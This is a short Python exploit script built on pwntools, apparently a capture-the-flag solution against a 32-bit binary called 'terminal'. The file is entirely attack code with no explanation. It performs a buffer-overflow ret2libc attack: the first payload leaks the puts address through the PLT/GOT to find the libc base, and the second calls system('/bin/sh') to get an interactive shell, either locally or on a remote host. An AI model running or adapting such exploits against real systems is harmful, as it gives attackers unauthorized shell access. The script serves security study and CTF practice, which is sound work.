#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('terminal')
libc = ELF("./libc6-i386_2.39-0ubuntu8.3_amd64.so")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    offset = 62
    main = 0x804974D

    payload = b"A"*offset
    payload += p32(exe.plt["puts"])
    payload += p32(main)
    payload += p32(exe.got["puts"])

    io.sendline(payload)

    io.recvuntil("# ")
    libc.address = u32(io.recv(4)) - libc.sym["puts"]
    info("libc base: %#x", libc.address)

    sh = next(libc.search(b'/bin/sh\x00'))

    payload = b"B"*offset
    payload += p32(libc.sym["system"])
    payload += p32(0x0)
    payload += p32(sh)

    io.sendline(payload)
    io.clean()

    io.interactive()


def main():
    
    init()
    solve()


if __name__ == '__main__':
    main()

